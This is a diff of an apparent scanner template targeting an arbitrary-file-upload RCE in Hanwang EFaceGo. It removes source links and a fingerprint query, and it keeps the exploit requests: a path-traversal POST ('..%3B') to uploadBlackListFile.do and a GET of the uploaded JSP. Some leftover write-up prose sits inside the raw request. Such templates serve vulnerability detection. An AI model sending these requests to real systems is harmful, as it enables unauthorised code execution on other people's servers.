@@ -3,12 +3,8 @@ info:
   name: 汉王EFaceGo uploadBlackListFile存在任意文件上传导致RCE
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fx5ktsa51p57nfq1'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fx5ktsa51p57nfq1
-    fofa: icon_hash="1380907357"
 http:
 - raw:
   - 'POST /manage/mobiVisit/..%3B/systemBlackList/uploadBlackListFile.do HTTP/1.1
@@ -37,7 +33,6 @@ http:
 
     ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1746175099960-6f3d6ef6-3e77-4816-a270-50480645b472.png)
 
     拼接访问路径'
   redirects: false
@@ -48,10 +43,7 @@ http:
 - raw:
   - 'GET /manage/resource/ca7a41938add40fa9edd82eb35b59b50.jsp HTTP/1.1
 
-    Host: {{Hostname}}
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1746175100142-7abde92e-e181-4e67-be9e-c876ca094938.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
